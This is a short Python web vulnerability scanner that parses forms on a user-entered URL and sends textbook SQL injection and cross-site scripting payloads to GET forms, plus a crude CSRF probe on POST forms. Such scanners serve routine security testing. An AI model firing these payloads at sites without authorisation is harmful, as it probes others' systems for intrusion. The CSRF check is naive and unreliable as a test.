import urllib.request
import urllib.parse
import urllib.error
import html.parser
import json
from urllib.parse import urljoin

# Define payloads for testing vulnerabilities
SQLI_PAYLOADS = ["' OR '1'='1", "' OR 'a'='a", "' OR 1=1 --", "' OR 'a'='a' --"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]
CSRF_PAYLOADS = ["csrf_token=malicious_token"]

class FormParser(html.parser.HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.current_form = None
        self.current_input = None
    
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == 'form':
            self.current_form = {
                'action': attrs.get('action', ''),
                'method': attrs.get('method', 'get').lower(),
                'inputs': []
            }
            self.forms.append(self.current_form)
        elif tag == 'input' and self.current_form is not None:
            self.current_form['inputs'].append({
                'name': attrs.get('name', ''),
                'value': attrs.get('value', '')
            })

def make_request(url, params=None, method='GET', data=None):
    try:
        if method.upper() == 'GET' and params:
            url = f"{url}?{urllib.parse.urlencode(params)}"
        
        if method.upper() == 'POST' and data:
            data = urllib.parse.urlencode(data).encode('utf-8')
        else:
            data = None

        headers = {
            'User-Agent': 'Mozilla/5.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        
        req = urllib.request.Request(url, data=data, headers=headers)
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error making request: {str(e)}")
        return ""

def test_sqli(url, params):
    print(f"[*] Testing for SQL Injection on {url}")
    for payload in SQLI_PAYLOADS:
        test_params = {k: payload for k in params.keys()}
        response = make_request(url, params=test_params)
        if "error" in response.lower() or "syntax" in response.lower():
            print(f"[!] Possible SQL Injection vulnerability found with payload: {payload}")
            return True
    print("[*] No SQL Injection vulnerabilities detected.")
    return False

def test_xss(url, params):
    print(f"[*] Testing for XSS on {url}")
    for payload in XSS_PAYLOADS:
        test_params = {k: payload for k in params.keys()}
        response = make_request(url, params=test_params)
        if payload in response:
            print(f"[!] Possible XSS vulnerability found with payload: {payload}")
            return True
    print("[*] No XSS vulnerabilities detected.")
    return False

def test_csrf(url, form_action):
    print(f"[*] Testing for CSRF on {url}")
    csrf_url = urljoin(url, form_action)
    for payload in CSRF_PAYLOADS:
        response = make_request(csrf_url, method='POST', data={'csrf_token': 'malicious_token'})
        if response and "success" in response.lower():
            print(f"[!] Possible CSRF vulnerability found with payload: {payload}")
            return True
    print("[*] No CSRF vulnerabilities detected.")
    return False

def extract_forms(url):
    response = make_request(url)
    parser = FormParser()
    parser.feed(response)
    return parser.forms

def scan_website(url):
    print(f"[*] Scanning {url} for vulnerabilities...")
    forms = extract_forms(url)

    for form in forms:
        action = form['action']
        method = form['method']
        params = {input['name']: input['value'] for input in form['inputs']}

        if method == "get":
            target_url = urljoin(url, action)
            test_sqli(target_url, params)
            test_xss(target_url, params)
        elif method == "post":
            target_url = urljoin(url, action)
            test_csrf(target_url, action)

if __name__ == "__main__":
    target_url = input("Enter the URL to scan: ")
    scan_website(target_url)